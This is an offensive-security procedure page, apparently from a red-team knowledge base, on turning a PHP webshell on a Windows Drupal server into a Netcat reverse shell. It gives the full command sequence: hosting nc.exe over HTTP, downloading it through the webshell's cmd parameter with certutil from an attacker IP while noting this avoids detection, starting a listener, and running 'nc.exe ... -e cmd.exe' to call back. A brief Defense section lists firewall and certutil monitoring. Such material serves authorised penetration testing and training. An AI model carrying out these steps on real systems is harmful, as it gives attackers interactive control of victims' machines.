---
id: aca84411-6029-42ec-bf05-2c58c836bebb
type: procedure
verified: true
submitted: true
created_at: '2019-12-05T22:28:02.952450+00:00'
updated_at: '2023-05-26T15:57:13.157645+00:00'
tactics:
  - '[[tactics/execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/command-and-scripting-interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/ingress-tool-transfer|T1105 - Ingress Tool Transfer]]'
sub_techniques:
  - '[[Windows Command Shell]]'
platforms:
  - Windows
tags:
  - network
  - shell
  - reverse-shell
commands:
  - '[[commands/python3-launch-http-server]]'
  - '[[commands/download-file-remote-http-certutil]]'
  - '[[commands/create-netcat-listener]]'
  - '[[commands/execute-netcat-command-shell-cmd-exe-rce]]'
tools:
  - '[[tools/Netcat]]'
validated: true
---

# Upgrade Website RCE to Netcat Reverse Shell Windows

## Summary

This procedure leverages an existing PHP webshell on a Windows-hosted Drupal site to download Netcat, establishing a reverse TCP shell for interactive command execution, bypassing native Windows restrictions on direct shell spawning.

## Description

Windows environments often block native reverse shell functions via AppLocker or group policy, necessitating tool transfer like Netcat. Using certutil (built-in) for download avoids detection, and the webshell delivers the execution command. This upgrades limited RCE to full shell access, enabling further post-exploitation.

## Requirements

1. Active PHP webshell (e.g., from Drupal RCE) with command execution
2. Attacker IP reachable from target (outbound TCP allowed)
3. Netcat binary (nc.exe) hosted on attacker's HTTP server
4. Writable directory on target (e.g., C:\Windows\Tasks)

## Defense

Block outbound connections to attacker IPs/ports with firewalls. Monitor for certutil.exe usage in command lines (unusual for normal ops). Enable PowerShell logging and process creation auditing to detect tool downloads and executions.

## Objectives

1. Transfer Netcat binary to the target via HTTP
2. Establish a reverse shell connection
3. Verify interactive access for privilege escalation

## Instructions

### Step 1: Host Netcat Binary on Attacker Server

**Context**: Serve nc.exe over HTTP for download by the target.

**Command** ([[commands/python3-launch-http-server]]):
```bash
python3 -m http.server $_PORT
```

> Place nc.exe in the current directory. Expected output: "Serving HTTP on 0.0.0.0 port $_PORT". Use port 80 if possible; confirm accessibility with curl from another machine.

### Step 2: Download Netcat via Webshell

**Context**: Use the webshell's ?cmd= parameter to run certutil and fetch the binary to a writable path.

**Command** ([[commands/download-file-remote-http-certutil]]):
```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/nc.exe" $_PATH\nc.exe
```

> Append to webshell URL: cmdshell.php?cmd=certutil.exe... Expected: "CertUtil: -URLCache command completed successfully." Verify with ?cmd=dir $_PATH showing nc.exe.

### Step 3: Set Up Listener and Execute Reverse Shell

**Context**: Listen for incoming connection and trigger the shell from the webshell.

**Command** ([[commands/create-netcat-listener]]):
```bash
nc -lvnp $_ATTACKER_PORT
```

> Then execute via webshell with [[commands/execute-netcat-command-shell-cmd-exe-rce]]:
```command_prompt
cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```

> Expected: Connection on listener with Windows prompt. Test with whoami; if successful, shell is upgraded. If blocked, try PowerShell alternatives or different paths.
